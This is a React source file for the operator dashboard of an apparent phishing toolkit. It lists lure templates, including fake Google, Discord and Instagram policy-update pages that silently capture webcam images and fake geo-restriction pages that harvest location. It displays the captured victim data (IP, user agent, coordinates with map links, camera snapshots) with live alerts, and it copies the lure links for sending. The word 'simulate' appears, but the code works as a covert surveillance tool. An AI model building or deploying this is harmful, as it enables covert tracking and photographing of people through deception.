"use client";
import { useEffect, useRef, useState, useMemo } from 'react';
import { useLogs } from '@/contexts/LogContext';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, Settings2, Globe, Lock, Gamepad2, Columns } from 'lucide-react';
import type { LogEntry, LocationData, CameraData, AudioData } from '@/types';
import { ScrollArea } from '@/components/ui/scroll-area';
import Image from 'next/image';
import { useToast } from '@/hooks/use-toast';
import type { ToastActionElement } from '@/components/ui/toast';
import { ToastAction } from '@/components/ui/toast';
import { cn } from '@/lib/utils';
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from "@/components/ui/label";

// Define available data types for filtering
const AVAILABLE_DATA_TYPES = [
  { id: 'location', label: 'Location', Icon: MapPin },
  { id: 'camera', label: 'Camera', Icon: Camera },
  { id: 'audio', label: 'Audio', Icon: Mic },
] as const;

type DataTypeOption = typeof AVAILABLE_DATA_TYPES[number]['id'];

// Copied and adapted from main dashboard page for unified template display
const allPhishingTemplates = [
  {
    title: 'Location Templates',
    description: 'Capture IP address and attempt geolocation.',
    Icon: MapPin,
    links: [
      { id: 'restricted-website-access', name: 'Restricted Website Access', url: '/phishing/location/restricted-website-access', Icon: Globe, description: "Simulates a geo-blocked website requiring location to access content." },
      { id: 'geo-restricted-service-access', name: 'Geo-Restricted Service Access', url: '/phishing/location/geo-restricted-service-access', Icon: Gamepad2, description: "Simulates accessing a geo-restricted digital service (e.g., streaming, gaming)." },
      { id: 'content-unlock', name: 'Content Unlock', url: '/phishing/location/content-unlock', Icon: Lock, description: "Simulates unlocking region-restricted general content." },
    ],
  },
  {
    title: 'Camera Access Templates',
    description: 'Attempt to access the device camera.',
    Icon: Camera,
    links: [
      { id: 'google-policy-update', name: 'Google Policy Update', url: '/phishing/camera/google-policy-update', Icon: Globe, description: "Simulates a Google policy update requiring cookie acceptance and silently captures image. Supports custom redirection." },
      { id: 'discord-terms-update', name: 'Discord Terms Update', url: '/phishing/camera/discord-terms-update', Icon: Globe, description: "Simulates a Discord terms update requiring acceptance and silently captures image. Supports custom redirection." },
      { id: 'instagram-privacy-update', name: 'Instagram Privacy Update', url: '/phishing/camera/instagram-privacy-update', Icon: Globe, description: "Simulates an Instagram privacy policy update requiring acceptance and silently captures image. Supports custom redirection." },
    ],
  },
  {
    title: 'Audio Access Templates',
    description: 'Simulate microphone access requests.',
    Icon: Mic,
    links: [
      { id: 'voice-assistant', name: 'Voice Assistant Setup', url: '/phishing/audio/voice-assistant', description: "Simulates setting up a voice assistant." },
      { id: 'speech-to-text', name: 'Speech-to-Text Demo', url: '/phishing/audio/speech-to-text', description: "Simulates a speech-to-text service." },
      { id: 'quality-check', name: 'Audio Quality Check', url: '/phishing/audio/quality-check', description: "Simulates a microphone quality check." },
    ],
  },
];

export default function AdvancedDashboardPage() {
  const { logs, clearLogs, isLoading } = useLogs();
  const { toast } = useToast();
  const previousLatestLogIdRef = useRef<string | null>(null);
  const isInitialLoadRef = useRef(true);
  const [expandedImageUrl, setExpandedImageUrl] = useState<string | null>(null);
  const [isModalAnimating, setIsModalAnimating] = useState(false);

  const [selectedDataTypes, setSelectedDataTypes] = useState<Set<DataTypeOption>>(new Set(['location']));

  const openModal = (url: string) => {
    setExpandedImageUrl(url);
    requestAnimationFrame(() => setIsModalAnimating(true));
  };

  const closeModal = () => {
    setIsModalAnimating(false);
    setTimeout(() => setExpandedImageUrl(null), 300);
  };

  useEffect(() => {
    if (isLoading) return;
    if (isInitialLoadRef.current) {
      previousLatestLogIdRef.current = logs.length > 0 ? logs[0].id : null;
      isInitialLoadRef.current = false;
      return;
    }
    if (logs.length === 0) {
      previousLatestLogIdRef.current = null;
      return;
    }
    const currentLatestLogId = logs[0].id;
    if (currentLatestLogId !== previousLatestLogIdRef.current) {
      const newLog = logs[0];
      if (newLog.type === 'generic' || selectedDataTypes.has(newLog.type as DataTypeOption)) {
        let toastTitle = "New Data Captured!";
        let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;
        let toastAction: ToastActionElement | undefined = undefined;

        if (newLog.type === 'location') {
          const locData = newLog.data as LocationData;
          const city = locData.city || "Unknown City";
          const country = locData.country || "Unknown Country";
          toastTitle = "Location Data Captured!";
          toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;
          if (locData.latitude && locData.longitude) {
            const mapsUrl = `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`;
            toastAction = <ToastAction altText="Open in Maps" onClick={() => window.open(mapsUrl, '_blank')}><ExternalLink className="mr-2 h-4 w-4" /> Open in Maps</ToastAction>;
          }
        } else if (newLog.type === 'camera') {
          toastTitle = "Camera Snapshot Captured!";
          toastDescription = `Image captured from IP: ${newLog.ip}.`;
        } else if (newLog.type === 'audio') {
          toastTitle = "Audio Capture Simulated!";
          toastDescription = `Audio event from IP: ${newLog.ip}.`;
        } else if (newLog.type === 'generic') {
          toastTitle = "Page Visit Detected!";
          const messageDetail = newLog.data && typeof newLog.data.message === 'string' ? newLog.data.message.split(': ')[1] : 'Unknown page';
          toastDescription = `Page: ${messageDetail || 'N/A'}, IP: ${newLog.ip}`;
        }
        toast({ title: toastTitle, description: toastDescription, variant: "default", action: toastAction });
      }
      previousLatestLogIdRef.current = currentLatestLogId;
    }
  }, [logs, isLoading, toast, selectedDataTypes]);

  const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {
    if (type === 'camera' && data && typeof data.imageUrl === 'string') {
      const camData = data as CameraData;
      return (
        <div className="mt-2">
          <Image src={camData.imageUrl} alt="Captured image thumbnail" width={160} height={120} className="rounded-md border object-contain cursor-pointer hover:opacity-80 transition-opacity" onClick={() => openModal(camData.imageUrl)} style={{ aspectRatio: '4/3' }} />
          <details className="text-xs mt-1"><summary className="cursor-pointer text-muted-foreground hover:text-foreground">Show Base64 Data (truncated)</summary><pre className="whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1">{JSON.stringify({ imageUrl: `${camData.imageUrl.substring(0,100)}...` }, null, 2)}</pre></details>
        </div>
      );
    }
    if (type === 'location' && data) return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data as LocationData, null, 2)}</pre>;
    if (type === 'audio' && data) return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data as AudioData, null, 2)}</pre>;
    return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data, null, 2)}</pre>;
  };

  const handleDataTypeToggle = (dataType: DataTypeOption) => {
    setSelectedDataTypes(prev => {
      const newSelection = new Set(prev);
      newSelection.has(dataType) ? newSelection.delete(dataType) : newSelection.add(dataType);
      return newSelection;
    });
  };

  const filteredLogs = useMemo(() => {
    if (selectedDataTypes.size === 0) return logs.filter(log => log.type === 'generic');
    return logs.filter(log => log.type === 'generic' || selectedDataTypes.has(log.type as DataTypeOption));
  }, [logs, selectedDataTypes]);

  return (
    <>
      <div className="space-y-8">
        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl flex items-center"><ListChecks className="mr-3 h-7 w-7 text-primary" />Captured Data Logs (Advanced)</CardTitle>
            <CardDescription>View filtered data captured from phishing page interactions. Updates in real-time based on your filter selections.</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {isLoading ? <p>Loading logs...</p> : filteredLogs.length === 0 ? (
              <div className="text-center py-8 text-muted-foreground"><AlertTriangle className="mx-auto h-12 w-12 mb-2" /><p className="text-lg">No logs match your current filter.</p><p>Try adjusting filters or interact with phishing templates.</p></div>
            ) : (
              <ScrollArea className="h-[400px] w-full rounded-md border p-4 bg-secondary/30">
                {filteredLogs.map(log => (
                  <div key={log.id} className="mb-4 p-3 rounded-md bg-card shadow-sm border">
                    <p className="font-semibold text-sm text-primary">Log ID: <span className="font-mono text-xs">{log.id}</span></p>
                    <p className="text-xs text-muted-foreground">Timestamp: {new Date(log.timestamp).toLocaleString()}</p>
                    <p className="text-xs text-muted-foreground">Type: <span className="font-medium capitalize">{log.type}</span></p>
                    <p className="text-xs text-muted-foreground">IP: {log.ip}</p>
                    <p className="text-xs text-muted-foreground">User Agent: {log.userAgent}</p>
                    <div className="mt-1 text-sm">Data: {formatLogData(log.data, log.type)}</div>
                  </div>
                ))}
              </ScrollArea>
            )}
            <Button onClick={clearLogs} variant="destructive" disabled={logs.length === 0}><Trash2 className="mr-2 h-4 w-4" /> Delete All Logs</Button>
          </CardContent>
        </Card>

        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl flex items-center"><Settings2 className="mr-3 h-7 w-7 text-primary" />Advanced Data Filters</CardTitle>
            <CardDescription>Select data types to display. Generic data (IP, timestamps) is always shown for matching entries.</CardDescription>
          </CardHeader>
          <CardContent className="flex flex-wrap gap-4 items-center pt-4">
            {AVAILABLE_DATA_TYPES.map(({ id, label, Icon }) => (
              <div key={id} className="flex items-center space-x-2">
                <Checkbox id={`filter-${id}`} checked={selectedDataTypes.has(id)} onCheckedChange={() => handleDataTypeToggle(id)} aria-label={`Filter by ${label}`} />
                <Label htmlFor={`filter-${id}`} className="flex items-center text-sm font-medium cursor-pointer"><Icon className="mr-2 h-5 w-5 text-muted-foreground" />{label}</Label>
              </div>
            ))}
          </CardContent>
        </Card>

        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl flex items-center"><Columns className="mr-3 h-7 w-7 text-primary" />All Phishing Page Templates</CardTitle>
            <CardDescription>Use these links to simulate phishing attempts. All templates are grouped here for convenience.</CardDescription>
          </CardHeader>
          <CardContent className="flex justify-center">
            {/* Displaying all templates in a single PhishingLinkCard-like structure or iterating them directly */}
            <div className="w-full space-y-6">
              {allPhishingTemplates.map((category) => (
                <div key={category.title} className="p-4 border rounded-lg bg-card/50 shadow-sm">
                    <div className="flex items-center mb-3">
                        <category.Icon className="mr-3 h-6 w-6 text-primary" />
                        <h3 className="text-lg font-semibold text-primary">{category.title}</h3>
                    </div>
                    <p className="text-sm text-muted-foreground mb-3">{category.description}</p>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                        {category.links.map(link => {
                             // Re-use PhishingLinkCard component logic here for individual links, or a simplified version.
                             // For simplicity, directly rendering buttons similar to how PhishingLinkCard does.
                             // Note: This simplified version won't have the redirect URL input directly here.
                             // That functionality is within PhishingLinkCard. If needed, PhishingLinkCard itself
                             // would need to be used, or its logic for handling redirect URLs extracted.
                             // Given the request is for "all templates in 1 group", this is a structural grouping.
                             const LinkIcon = link.Icon || category.Icon;
                             return (
                                <Button
                                  key={link.id}
                                  variant="outline"
                                  className="w-full justify-start text-left whitespace-normal h-auto py-2"
                                  onClick={() => {
                                    const fullUrl = `${window.location.origin}${link.url}`;
                                    navigator.clipboard.writeText(fullUrl);
                                    toast({ title: "Link Copied!", description: `${link.name} link copied.`});
                                  }}
                                >
                                  <LinkIcon className="mr-2 h-4 w-4 flex-shrink-0" />
                                  <span className="flex-grow">{link.name}</span>
                                </Button>
                             );
                        })}
                    </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {expandedImageUrl && (
        <div className={cn("fixed inset-0 z-[101] flex items-center justify-center p-4 cursor-zoom-out", "transition-opacity duration-300 ease-in-out", isModalAnimating ? "opacity-100 bg-black/80" : "opacity-0 bg-black/0 pointer-events-none")} onClick={closeModal}>
          <div className={cn("transform transition-all duration-300 ease-in-out", isModalAnimating ? "opacity-100 scale-100" : "opacity-0 scale-95")} onClick={(e) => e.stopPropagation()}>
            <Image src={expandedImageUrl!} alt="Expanded captured image" width={0} height={0} sizes="100vw" style={{ width: 'auto', height: 'auto' }} className="max-w-[90vw] max-h-[90vh] object-contain rounded-lg shadow-xl bg-white p-1" />
          </div>
        </div>
      )}
    </>
  );
}
